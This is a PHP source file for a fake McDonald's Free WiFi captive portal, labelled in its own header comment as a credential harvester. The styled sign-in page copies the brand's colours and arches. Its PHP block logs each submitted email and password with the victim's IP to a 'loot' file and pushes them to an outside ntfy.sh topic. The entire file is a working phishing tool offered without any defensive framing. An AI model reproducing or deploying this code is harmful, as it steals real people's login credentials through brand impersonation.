<?php
// GARMR MCDONALDS Portal - Credential Harvester
$loot_file = "/root/loot/garmr/creds.txt";
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $timestamp = date("Y-m-d H:i:s");
    $ip = $_SERVER["REMOTE_ADDR"];
    $ua = $_SERVER["HTTP_USER_AGENT"];
    @mkdir(dirname($loot_file), 0755, true);
    $entry = "[$timestamp] MCDONALDS | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
    file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
    
    if (!empty($ntfy_topic)) {
        $msg = "🍔 MCDONALDS CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
        // PHP native curl (shell_exec unreliable)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $msg);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: GARMR Creds", "Priority: high", "Tags: key,rotating_light"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
        
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>McDonald's Free WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #DA291C 0%, #FFC72C 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 100px;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #DA291C;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 700;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #292929;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #FFC72C;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #DA291C;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #bf2318;
        }
        .promo {
            margin-top: 20px;
            padding: 15px;
            background: #FFF8E7;
            border-radius: 8px;
            font-size: 13px;
            color: #292929;
        }
        .promo strong {
            color: #DA291C;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 120 100" xmlns="http://www.w3.org/2000/svg">
                <!-- McDonald's Golden Arches -->
                <path d="M10 90 Q10 20 35 20 Q50 20 50 50 L50 90"
                      fill="none" stroke="#FFC72C" stroke-width="16" stroke-linecap="round"/>
                <path d="M110 90 Q110 20 85 20 Q70 20 70 50 L70 90"
                      fill="none" stroke="#FFC72C" stroke-width="16" stroke-linecap="round"/>
            </svg>
        </div>

        <h1>McDonald's Free WiFi</h1>
        <p class="subtitle">Sign in for free internet access</p>

        <form method="POST" action="">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Connect Free WiFi</button>
        </form>

        <div class="promo">
            <strong>🍟 MyMcDonald's Rewards</strong><br>
            Earn points on every order! Download the app.
        </div>

        <p class="terms">
            By connecting, you agree to McDonald's Terms of Use and Privacy Policy.
            Free WiFi provided for customer use.
        </p>
    </div>
</body>
</html>
